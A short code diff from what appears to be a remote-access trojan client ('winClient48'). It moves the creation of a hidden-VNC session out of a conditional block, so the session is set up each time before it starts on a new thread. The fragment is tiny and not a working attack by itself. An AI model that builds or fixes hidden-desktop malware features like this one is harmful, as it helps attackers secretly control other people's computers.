@@ -3063,9 +3063,9 @@ namespace winClient48
                             {
                                 hvnc = new clsfnHvncSession(v, szName);
                                 m_lsHVNC.Add(hvnc);
-                                hvnc.fnCreate(szExe);
                             }
 
+                            hvnc.fnCreate(szExe);
                             hvnc.m_bRunning = true;
 
                             new Thread(() => hvnc.fnStart(nDelay)).Start();
